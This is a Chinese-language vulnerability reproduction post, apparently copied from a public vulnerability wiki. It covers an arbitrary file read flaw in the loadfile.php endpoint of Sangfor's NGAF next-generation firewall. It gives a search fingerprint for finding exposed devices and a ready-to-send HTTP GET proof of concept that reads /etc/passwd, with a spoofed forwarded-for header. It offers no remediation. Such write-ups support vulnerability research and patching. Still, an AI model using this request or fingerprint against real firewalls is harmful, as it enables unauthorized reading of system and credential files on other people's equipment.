---
title: "深信服 NGAF下一代防火墙 loadfile.php 任意文件读取漏洞"
date: 2026-10-18 09:16:22
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "深信服"
tags:
  - "深信服"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

深信服下一代防火墙是一款以应用安全需求出发而设计的下一代应用防火墙。深信服下一代防火墙在 loadfile.php 处存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等。

## 漏洞影响

深信服 NGAF下一代防火墙

## 网络测绘

```
"Redirect.php?url=LogInOut.php"
```

## 漏洞复现

登陆页面

![image-20231115101204343](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231115101204343.png)

poc

```
GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
Host: 
User-Agent: Opera/8.90.(Windows NT 6.0; is-IS) Presto/2.9.177 Version/10.00
Accept-Encoding: gzip, deflate
Accept: */*
y-forwarded-for: 127.0.0.1
```

![image-20231115101759670](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231115101759670.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E6%B7%B1%E4%BF%A1%E6%9C%8D-NGAF%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-loadfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
